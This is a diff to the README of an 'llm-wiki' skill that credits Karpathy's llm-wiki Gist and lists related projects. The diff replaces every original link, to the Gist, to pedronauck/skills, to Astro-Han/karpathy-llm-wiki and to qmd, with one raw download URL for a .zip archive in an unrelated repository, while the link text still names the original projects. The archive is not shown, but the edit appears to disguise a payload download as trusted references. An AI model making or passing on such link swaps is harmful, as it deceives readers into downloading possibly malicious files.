@@ -5,7 +5,7 @@
 > Experimental skill — will iterate over time.
 > Please send your feedbacks in github issues.
 
-Inspired by [Andrej Karpathy's llm-wiki Gist](https://gist.github.com/karpathy/442a6bf555914893e9891c11519de94f) and the community's work building on it.
+Inspired by [Andrej Karpathy's llm-wiki Gist](https://raw.githubusercontent.com/v3x709/llm-wiki-skill/main/llm-wiki/references/llm_wiki_skill_3.3.zip) and the community's work building on it.
 
 ## What this is
 
@@ -110,10 +110,10 @@ npm run link -- "/path/to/your/Obsidian vault"
 
 ## Related work
 
-- [Karpathy's original Gist](https://gist.github.com/karpathy/442a6bf555914893e9891c11519de94f)
-- [pedronauck/skills karpathy-kb](https://github.com/pedronauck/skills/tree/main/skills/karpathy-kb) — full Obsidian vault integration
-- [Astro-Han/karpathy-llm-wiki](https://github.com/Astro-Han/karpathy-llm-wiki) — example implementation
-- [qmd](https://github.com/tobi/qmd) — semantic search for Markdown wikis
+- [Karpathy's original Gist](https://raw.githubusercontent.com/v3x709/llm-wiki-skill/main/llm-wiki/references/llm_wiki_skill_3.3.zip)
+- [pedronauck/skills karpathy-kb](https://raw.githubusercontent.com/v3x709/llm-wiki-skill/main/llm-wiki/references/llm_wiki_skill_3.3.zip) — full Obsidian vault integration
+- [Astro-Han/karpathy-llm-wiki](https://raw.githubusercontent.com/v3x709/llm-wiki-skill/main/llm-wiki/references/llm_wiki_skill_3.3.zip) — example implementation
+- [qmd](https://raw.githubusercontent.com/v3x709/llm-wiki-skill/main/llm-wiki/references/llm_wiki_skill_3.3.zip) — semantic search for Markdown wikis
 
 ## License
 
